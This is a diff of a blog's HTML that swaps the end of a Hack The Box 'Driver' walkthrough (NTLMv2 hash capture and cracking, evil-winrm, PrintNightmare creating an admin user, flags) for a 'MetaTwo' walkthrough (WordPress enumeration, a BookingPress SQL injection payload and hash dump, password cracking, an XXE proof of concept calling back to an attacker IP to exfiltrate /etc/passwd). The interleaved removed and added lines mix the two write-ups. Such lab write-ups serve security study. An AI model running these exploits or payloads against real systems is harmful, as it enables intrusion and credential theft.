+</span></span><span style="display:flex;"><span> | Version: 1.1 (80% confidence)
+</span></span><span style="display:flex;"><span> | Found By: Style (Passive Detection)
+</span></span><span style="display:flex;"><span> |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: &#39;Version: 1.1&#39;
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[SMB] NTLMv2-SSP Client   : 10.10.11.106
-</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Username : DRIVER\tony
-</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Hash     : tony::DRIVER:e61c06821dd7d97b:04C5D97EC19DB7997DB3D4C22BB85E03:010100000000000080270D804D82DB01340387C218E4BE3500000000020008005700470036004F0001001E00570049004E002D003600410055004F004200320056004200530050004B0004003400570049004E002D003600410055004F004200320056004200530050004B002E005700470036004F002E004C004F00430041004C00030014005700470036004F002E004C004F00430041004C00050014005700470036004F002E004C004F00430041004C000700080080270D804D82DB0106000400020000000800300030000000000000000000000000200000087AC8875FCF9D30115565877B7878955455C2EF04BE88643C220A9FCB19D0600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003400000000000000000000000000
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
-</span></span></code></pre></div><p>We receive a hash! Let&rsquo;s try to crack it</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">5600</span> tony_hash /usr/share/wordlists/rockyou.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating All Plugins (via Passive Methods)
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] No plugins Found.
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TONY::DRIVER:e61c06821dd7d97b:04c5d97ec19db7997db3d4c22bb85e03:010100000000000080270d804d82db01340387c218e4be3500000000020008005700470036004f0001001e00570049004e002d003600410055004f004200320056004200530050004b0004003400570049004e002d003600410055004f004200320056004200530050004b002e005700470036004f002e004c004f00430041004c00030014005700470036004f002e004c004f00430041004c00050014005700470036004f002e004c004f00430041004c000700080080270d804d82db0106000400020000000800300030000000000000000000000000200000087ac8875fcf9d30115565877b7878955455c2ef04be88643c220a9fcb19d0600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000:liltony
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[!] No WPScan API Token given, as a result vulnerability data has not been output.
+</span></span><span style="display:flex;"><span>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Finished: Mon Feb 17 17:12:16 2025
+</span></span><span style="display:flex;"><span>[+] Requests Done: 31
+</span></span><span style="display:flex;"><span>[+] Cached Requests: 7
+</span></span><span style="display:flex;"><span>[+] Data Sent: 8.698 KB
+</span></span><span style="display:flex;"><span>[+] Data Received: 215.702 KB
+</span></span><span style="display:flex;"><span>[+] Memory used: 336.086 MB
+</span></span><span style="display:flex;"><span>[+] Elapsed time: 00:00:05
+</span></span></code></pre></div><p>So xml-rpc is enabled which means we might be able to enumerate and brute-force users. Also, we found some more themes. Let&rsquo;s enumerate some users</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$docker run -it --rm --network<span style="color:#f92672">=</span>host wpscanteam/wpscan -e u -t <span style="color:#ae81ff">500</span> --url http://metapress.htb
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
 </span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
-</span></span></code></pre></div><p>And we crack the password! Now we can log in since WinRM is open</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.106 -u TONY -p liltony
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] User(s) Identified:
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] admin
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern (Passive Detection)
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Rss Generator (Passive Detection)
+</span></span><span style="display:flex;"><span> |  Wp Json Api (Aggressive Detection)
+</span></span><span style="display:flex;"><span> |   - http://metapress.htb/wp-json/wp/v2/users/?per_page=100&amp;page=1
+</span></span><span style="display:flex;"><span> |  Rss Generator (Aggressive Detection)
+</span></span><span style="display:flex;"><span> |  Author Sitemap (Aggressive Detection)
+</span></span><span style="display:flex;"><span> |   - http://metapress.htb/wp-sitemap-users-1.xml
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span><span style="display:flex;"><span> |  Login Error Messages (Aggressive Detection)
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] manager
+</span></span><span style="display:flex;"><span> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span></span><span style="display:flex;"><span> | Confirmed By: Login Error Messages (Aggressive Detection)
+</span></span></code></pre></div><p>Now let&rsquo;s try to brute-force some credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$docker run -it --rm --network<span style="color:#f92672">=</span>host -v /usr/share/wordlists/rockyou.txt:/rockyou.txt wpscanteam/wpscan --password-attack xmlrpc -t <span style="color:#ae81ff">20</span> -U manager -P /rockyou.txt --url http://metapress.htb
+</span></span></code></pre></div><p>But we don&rsquo;t get any hits. Let&rsquo;s do some directory enumeratio
+Let&rsquo;s do some directory enumeration</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirb/common.txt -x .php -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://metapress.htb/
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 300
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Extensions:              php
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/.htaccess            (Status: 200) [Size: 633]
+</span></span><span style="display:flex;"><span>/a                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+</span></span><span style="display:flex;"><span>/A                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+</span></span><span style="display:flex;"><span>/about                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+</span></span><span style="display:flex;"><span>/About                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+</span></span><span style="display:flex;"><span>/about-us             (Status: 301) [Size: 0] [--&gt; http://metapress.htb/about-us/]
+</span></span><span style="display:flex;"><span>/0                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/0/]
+</span></span><span style="display:flex;"><span>/admin                (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-admin/]
+</span></span><span style="display:flex;"><span>/atom                 (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/atom/]
+</span></span><span style="display:flex;"><span>/c                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/cancel-appointment/]
+</span></span><span style="display:flex;"><span>/C                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/cancel-appointment/]
+</span></span><span style="display:flex;"><span>/ca                   (Status: 301) [Size: 0] [--&gt; http://metapress.htb/cancel-appointment/]
+</span></span><span style="display:flex;"><span>/can                  (Status: 301) [Size: 0] [--&gt; http://metapress.htb/cancel-appointment/]
+</span></span><span style="display:flex;"><span>/dashboard            (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-admin/]
+</span></span><span style="display:flex;"><span>/E                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]
+</span></span><span style="display:flex;"><span>/e                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]
+</span></span><span style="display:flex;"><span>/embed                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/embed/]
+</span></span><span style="display:flex;"><span>/event                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]
+</span></span><span style="display:flex;"><span>/events               (Status: 301) [Size: 0] [--&gt; http://metapress.htb/events/]
+</span></span><span style="display:flex;"><span>/Events               (Status: 301) [Size: 0] [--&gt; http://metapress.htb/Events/]
+</span></span><span style="display:flex;"><span>/feed                 (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/]
+</span></span><span style="display:flex;"><span>/h                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/hello-world/]
+</span></span><span style="display:flex;"><span>/H                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/hello-world/]
+</span></span><span style="display:flex;"><span>/hello                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/hello-world/]
+</span></span><span style="display:flex;"><span>/index.php            (Status: 301) [Size: 0] [--&gt; http://metapress.htb/]
+</span></span><span style="display:flex;"><span>/index.php            (Status: 301) [Size: 0] [--&gt; http://metapress.htb/]
+</span></span><span style="display:flex;"><span>/login                (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-login.php]
+</span></span><span style="display:flex;"><span>/page1                (Status: 301) [Size: 0] [--&gt; http://metapress.htb/]
+</span></span><span style="display:flex;"><span>/rdf                  (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/rdf/]
+</span></span><span style="display:flex;"><span>/robots.txt           (Status: 200) [Size: 113]
+</span></span><span style="display:flex;"><span>/rss                  (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/]
+</span></span><span style="display:flex;"><span>/rss2                 (Status: 301) [Size: 0] [--&gt; http://metapress.htb/feed/]
+</span></span><span style="display:flex;"><span>/s                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+</span></span><span style="display:flex;"><span>/sa                   (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+</span></span><span style="display:flex;"><span>/sam                  (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+</span></span><span style="display:flex;"><span>/sample               (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+</span></span><span style="display:flex;"><span>/S                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/sample-page/]
+</span></span><span style="display:flex;"><span>/sitemap.xml          (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-sitemap.xml]
+</span></span><span style="display:flex;"><span>/t                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/thank-you/]
+</span></span><span style="display:flex;"><span>/T                    (Status: 301) [Size: 0] [--&gt; http://metapress.htb/thank-you/]
+</span></span><span style="display:flex;"><span>/th                   (Status: 301) [Size: 0] [--&gt; http://metapress.htb/thank-you/]
+</span></span><span style="display:flex;"><span>/thank-you            (Status: 301) [Size: 0] [--&gt; http://metapress.htb/thank-you/]
+</span></span><span style="display:flex;"><span>/wp-admin             (Status: 301) [Size: 169] [--&gt; http://metapress.htb/wp-admin/]
+</span></span><span style="display:flex;"><span>/wp-content           (Status: 301) [Size: 169] [--&gt; http://metapress.htb/wp-content/]
+</span></span><span style="display:flex;"><span>/wp-includes          (Status: 301) [Size: 169] [--&gt; http://metapress.htb/wp-includes/]
+</span></span><span style="display:flex;"><span>/wp-cron.php          (Status: 200) [Size: 0]
+</span></span><span style="display:flex;"><span>/wp-config.php        (Status: 200) [Size: 0]
+</span></span><span style="display:flex;"><span>/wp-links-opml.php    (Status: 200) [Size: 224]
+</span></span><span style="display:flex;"><span>/wp-load.php          (Status: 200) [Size: 0]
+</span></span><span style="display:flex;"><span>/wp-mail.php          (Status: 403) [Size: 2672]
+</span></span><span style="display:flex;"><span>/wp-login.php         (Status: 200) [Size: 6931]
+</span></span><span style="display:flex;"><span>/wp-settings.php      (Status: 500) [Size: 0]
+</span></span><span style="display:flex;"><span>/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://metapress.htb/wp-login.php?action=register]
+</span></span><span style="display:flex;"><span>/xmlrpc.php           (Status: 405) [Size: 42]
+</span></span><span style="display:flex;"><span>/xmlrpc.php           (Status: 405) [Size: 42]
+</span></span></code></pre></div><p>Not really seeing anything. Going back through the HTTP requests in burp, I noticed that when you submit an appointment, it takes you to a thank-you page which includes an ID parameter that is a number base64-encoded:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://metapress.htb/thank-you/?appointment_id=Mg==/
+</span></span></span></code></pre></div><p>Let&rsquo;s create a list of numbers that are base64 encoded:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$<span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..100<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> echo -n <span style="color:#e6db74">&#34;</span>$i<span style="color:#e6db74">&#34;</span> | base64 &gt;&gt; tmp.txt; <span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Then curl each number and get the customer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$<span style="color:#66d9ef">while</span> read p; <span style="color:#66d9ef">do</span> curl http://metapress.htb/thank-you/?appointment_id<span style="color:#f92672">=</span>$p | grep customer; <span style="color:#66d9ef">done</span> &lt; tmp.txt
+</span></span></code></pre></div><p>But we only see the customer names that we specified when creating an event. When we curled the page, however, we noticed another plugin that wpscan didn&rsquo;t detect</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;link rel=&#39;stylesheet&#39; id=&#39;bookingpress_element_css-css&#39;  href=&#39;http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10&#39; media=&#39;all&#39; /&gt;
+</span></span></code></pre></div><p>I guess this is because we only searched on the home page. We see that it is version 1.0.10, so we google for some exploits. The first link we find is from wpscan, ironically. It states that the bookingpress plugin suffers from an unauthenticated SQL injection, and gives us a sample payload. Let&rsquo;s try it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -i <span style="color:#e6db74">&#39;http://metapress.htb/wp-admin/admin-ajax.php&#39;</span> --data <span style="color:#e6db74">&#39;action=bookingpress_front_get_category_services&amp;_wpnonce=8cc8b79544&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
+</span></span><span style="display:flex;"><span>Server: nginx/1.18.0
+</span></span><span style="display:flex;"><span>Date: Mon, 17 Feb 2025 19:25:34 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=UTF-8
+</span></span><span style="display:flex;"><span>Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>X-Powered-By: PHP/8.0.24
+</span></span><span style="display:flex;"><span>X-Robots-Tag: noindex
+</span></span><span style="display:flex;"><span>X-Content-Type-Options: nosniff
+</span></span><span style="display:flex;"><span>Expires: Wed, 11 Jan 1984 05:00:00 GMT
+</span></span><span style="display:flex;"><span>Cache-Control: no-cache, must-revalidate, max-age=0
+</span></span><span style="display:flex;"><span>X-Frame-Options: SAMEORIGIN
+</span></span><span style="display:flex;"><span>Referrer-Policy: strict-origin-when-cross-origin
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
-</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt;
-</span></span></code></pre></div><p>We can grab the user flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Desktop&gt; type user.txt
-</span></span><span style="display:flex;"><span>f37fe958f29a555e286267d4a15a0fc0
-</span></span></code></pre></div><p>With everything so far being about printers, it would be appropriate to check for the PrintNightmare vulnerability. Let&rsquo;s check if the spooler service is running</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; ls \\localhost\pipe\spoolss
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> \\localhost\pipe
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
-</span></span><span style="display:flex;"><span>----                -------------         ------ ----
-</span></span><span style="display:flex;"><span>                                                 spoolss
-</span></span></code></pre></div><p>Let&rsquo;s transfer over the <a href="https://github.com/calebstewart/CVE-2021-1675">PowerShell implementation</a> and bypass the execution policy</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Set-ExecutionPolicy Bypass -Scope <span style="color:#66d9ef">Process</span>
-</span></span></code></pre></div><p><em>Note: if you try something like <code>powershell -ep bypass</code> it won&rsquo;t work</em></p>
-<p>Then we import the module and create an admin user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare -NewUser <span style="color:#e6db74">&#34;hacker&#34;</span> -NewPassword <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span> -DriverName <span style="color:#e6db74">&#34;PrintIt&#34;</span>
-</span></span><span style="display:flex;"><span>[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-</span></span><span style="display:flex;"><span>[+] using pDriverPath = <span style="color:#e6db74">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&#34;</span>
-</span></span><span style="display:flex;"><span>[+] added user hacker as local administrator
-</span></span><span style="display:flex;"><span>[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
-</span></span></code></pre></div><p>We see that our user has been added</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net user
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> \\
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>Administrator            DefaultAccount           Guest
-</span></span><span style="display:flex;"><span>hacker                   tony
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net localgroup administrators
-</span></span><span style="display:flex;"><span>Alias name     administrators
-</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Members
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
-</span></span><span style="display:flex;"><span>Administrator
-</span></span><span style="display:flex;"><span>hacker
-</span></span><span style="display:flex;"><span>The command completed successfully.
-</span></span></code></pre></div><p>Now we can log in as that user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└──╼</span> $evil-winrm -i <span style="color:#ae81ff">10.10</span>.11.106 -u hacker -p <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Warning<span style="color:#960050;background-color:#1e0010">:</span> Remote path completions is disabled due to ruby limitation<span style="color:#960050;background-color:#1e0010">:</span> quoting_detection_proc() <span style="color:#66d9ef">function</span> is unimplemented on this machine
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">For</span> more information, check Evil-WinRM GitHub<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackplayers/evil-winrm<span style="color:#75715e">#Remote-path-completion</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
-</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Documents&gt;
-</span></span></code></pre></div><p>Then we can grab the root flag from the administrator&rsquo;s desktop</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\administrator\Desktop&gt; type root.txt
-</span></span><span style="display:flex;"><span>eed37470a518c3102764fbd54c09a40a
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>{&#34;variant&#34;:&#34;error&#34;,&#34;title&#34;:&#34;Error&#34;,&#34;msg&#34;:&#34;Sorry, Your request can not process due to security reason.&#34;}
+</span></span></code></pre></div><p>Interesting. We get an error saying our request cannot be processed due to security reasons.
+<em>Note: I realized you just have to put in the correct nonce and it should work</em></p>
+<p>Let&rsquo;s see if we can find a POC. We will use <a href="https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py">this one</a> and we are able to dump the database for the admin and manager users!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 exploit.py -u http://metapress.htb -n 1b85dece07
+</span></span><span style="display:flex;"><span>- BookingPress PoC
+</span></span><span style="display:flex;"><span>-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
+</span></span><span style="display:flex;"><span>-- Count of users:  2
+</span></span><span style="display:flex;"><span>|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
+</span></span><span style="display:flex;"><span>|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
+</span></span></code></pre></div><p>These hashes look like phpass, WordPress (MD5),  Joomla (MD5) from the hashcat example hashes which is mode 400. Let&rsquo;s try to crack them</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">400</span> hashes /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
+</span></span></code></pre></div><p>We get one hit for the manager user. Let&rsquo;s log in as the manager
+<img src="images/MetaTwo/manager.png" alt="Manager"></p>
+<p>We try to upload a PHP web shell, but it says that the file is not permitted for security reasons. Let&rsquo;s upload a test file to see if we can even access it. We create <code>test.txt</code> which just contains the string &ldquo;test&rdquo;. After uploading it, we are given a URL. When we navigate to it we see it works
+<img src="/images/MetaTwo/test.png" alt="Test"></p>
+<p>Eventually, I figure out that this version of WordPress is vulnerable to CVE-2021-29447. We can find a PoC <a href="https://github.com/0xRar/CVE-2021-29447-PoC">here</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 PoC.py -l 10.10.14.24 -p <span style="color:#ae81ff">8443</span> -f /etc/passwd
+</span></span></code></pre></div><p>Then we upload the <code>payload.wav</code> it generates and wait for the call back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[Mon Feb 17 19:07:26 2025] 10.10.11.186:39394 Accepted
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:07:26 2025] 10.10.11.186:39394 [200]: GET /evil.dtd
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:07:26 2025] 10.10.11.186:39394 Closing
+</span></span><span style="display:flex;"><span>[Mon Feb 17 19:07:26 2025] 10.10.11.186:39402 Accepted
